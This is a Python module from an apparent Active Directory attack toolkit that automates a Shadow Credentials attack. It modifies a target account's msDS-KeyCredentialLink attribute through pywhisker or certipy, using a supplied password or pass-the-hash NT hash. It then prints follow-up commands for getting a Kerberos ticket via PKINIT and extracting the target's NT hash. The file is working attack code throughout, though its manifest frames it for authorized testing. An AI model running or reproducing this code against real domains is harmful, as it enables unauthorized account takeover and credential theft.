"""Shadow Credentials  -  abuse msDS-KeyCredentialLink for PKINIT auth."""
import subprocess
import sys
import shutil
from typing import Any
from adxpl.core.credential import ADCredential

MANIFEST = {
    "capability_id": "adxpl.acl.shadow_credentials.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["ldap_modification", "key_credential_link"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1556.006"],
}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)
    target_account = getattr(args, "target_account", None)
    dc_ip = getattr(args, "dc_ip", args.target)
    action = getattr(args, "shadow_action", "add")
    pfx_output = getattr(args, "pfx_output", None)

    if not target_account:
        print("[!] --target-account required", file=sys.stderr)
        return 1

    print(f"[*] Shadow Credentials: {action} on {target_account} ({dc_ip})")

    if shutil.which("pywhisker"):
        cmd = [
            "pywhisker",
            "-d", args.domain,
            "-u", cred.username,
            "-t", target_account,
            "--action", action,
            "--dc-ip", dc_ip,
        ]
        if cred.password:
            cmd.extend(["-p", cred.password])
        elif cred.has_hash:
            cmd.extend(["--hashes", f"{cred.lm_hash}:{cred.nt_hash}"])

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        print(result.stdout)
        if result.returncode == 0 and action == "add":
            print("\n[*] Next steps:")
            print("  1. Use the generated PFX + password with PKINITtools")
            print(f"  2. gettgtpkinit.py -cert-pfx <pfx> -pfx-pass <pass> {args.domain}\\{target_account} <ccache>")
            print("  3. export KRB5CCNAME=<ccache>")
            print(f"  4. getnthash.py -key <AS-REP key> {args.domain}\\{target_account}")
        return result.returncode

    if shutil.which("certipy"):
        cmd = [
            "certipy", "shadow",
            action, "-u", f"{cred.username}@{args.domain}",
            "-account", target_account,
            "-dc-ip", dc_ip,
        ]
        if cred.password:
            cmd.extend(["-p", cred.password])

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        print(result.stdout)
        return result.returncode

    print("[!] pywhisker or certipy not found", file=sys.stderr)
    return 1
